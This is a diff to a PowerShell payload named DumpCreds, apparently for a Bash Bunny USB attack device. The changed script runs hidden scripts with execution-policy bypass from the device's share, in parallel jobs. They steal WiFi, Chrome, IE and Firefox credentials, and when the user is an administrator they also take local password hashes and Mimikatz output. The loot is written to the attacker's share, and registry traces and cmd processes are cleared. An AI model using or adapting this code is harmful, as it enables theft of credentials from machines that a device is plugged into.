@@ -10,14 +10,17 @@
    DumpCred
 #>
 
-$_Version = "2.0.1"
-$_BUILD = "1000"
+$_Version = "2.0.2"
+$_BUILD = "1001"
 
 # Share on bashbunny
 $SHARE="\\172.16.64.1\e"
 $LOOT="$SHARE\loot"
+
+
 $FILE="$LOOT\$env:COMPUTERNAME.txt"
-$TMPFILE="$env:TEMP\~oou365AF.tmp"
+$TMPFILE=[System.IO.Path]::GetTempFileName()
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 $LINE3="`n`n`n"
 
 # Wait for Share
@@ -45,53 +48,45 @@ Write-Host "!"
 
 Remove-Item $TMPFILE -ErrorAction SilentlyContinue
 
+# Set Output buffer width to 500
+# Update output buffer size to prevent clipping in Visual Studio output window.
+if( $Host -and $Host.UI -and $Host.UI.RawUI ) {
+  $rawUI = $Host.UI.RawUI
+  $oldSize = $rawUI.BufferSize
+  $typeName = $oldSize.GetType( ).FullName
+  $newSize = New-Object $typeName (500, $oldSize.Height)
+  $rawUI.BufferSize = $newSize
+}
 
-"###DumpCreds " + $_VERSION + " Build " + $_BUILD | Set-Content $TMPFILE
-"=======================================================" | Add-Content $TMPFILE
+
+"###DumpCreds " + $_VERSION + " Build " + $_BUILD + "     Admin Mode: " + $isAdmin| OUT-File $TMPFILE
+"=======================================================" | OUT-File -append $TMPFILE
 $LINE3 | Add-Content $TMPFILE
 
-# Dumps WiFi Passwords
-Write-Host "WifiCreds"
-$WiFiCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1
-$WifiCreds | Add-Content $TMPFILE
-$LINE3 | Add-Content $TMPFILE
 
+# Start all Scripts in $SHARE\PS as job
 
-# Dumps all the local Hashes
-Write-Host "Hashes"
-$PowerDump = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1
-$Powerdump | Add-Content $TMPFILE
-$LINE3 | Add-Content $TMPFILE
+# First remove all jobs  I'm so bad....., don't care about running jobs
+Stop-Job *
+Remove-Job *
 
-# Dumps Chrome Credentials
-Write-Host "ChromeCreds"
-$ChromeCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1
-$ChromeCreds | Add-Content $TMPFILE
-$LINE3 | Add-Content $TMPFILE
+# Start all Jobs as background jobs
+Write-Host "Wifi-Cred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1} | Out-Null
+Write-Host "ChromeCred" ;  start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1} | Out-Null
+Write-Host "IECred" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1} | Out-Null
+Write-Host "FireFoxCred" ; start-job -RunAs32 -ArgumentList $SHARE {param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1} | Out-Null
+Write-Host "Inventory" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1} | Out-Null
+if ($isAdmin) {
+    Write-Host "Hashes" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1} | Out-Null
+    Write-Host "M1m1k@tz" ; start-job -ArgumentList $SHARE {Param($SHARE); powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-M1m1k@tz.ps1} | Out-Null
+}
 
-# Dumps IE Credentials
-Write-Host "IECreds" 
-$IECreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1
-$IECreds | Add-Content $TMPFILE
-$LINE3 | Add-Content $TMPFILE
+# Wait for all jobs
+Get-Job | Wait-Job | Out-Null
 
-# Dumps FireFox Credentials
-Write-Host "FFCreds"
-$powershellx86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
-$FoxCreds = & $powershellx86 -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1
-$FoxCreds | Add-Content $TMPFILE
-$LINE3 | Add-Content $TMPFILE
+# Receive all results
+Get-Job | Receive-Job | Out-File -Append $TMPFILE
 
-# M1m1kat3 Output
-Write-Host "M1m1k@tz"
-$M1m1d0gz = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-M1m1d0gz.ps1
-$M1m1d0gz | Add-Content $TMPFILE
-$LINE3 | Add-Content $TMPFILE
-
-# Get Computer Inventory
-write-host "ComputerInventory"
-$Inventory = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1
-$Inventory | Add-Content $TMPFILE
 
 
 #Move TMP File to Bunny
@@ -103,3 +98,9 @@ Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explo
 
 # Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
 Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"
+
+# Kill cmde.exe 
+Stop-Process -name cmd -ErrorAction SilentlyContinue
+
+# Remove all Jobs from Joblist
+Remove-Job *
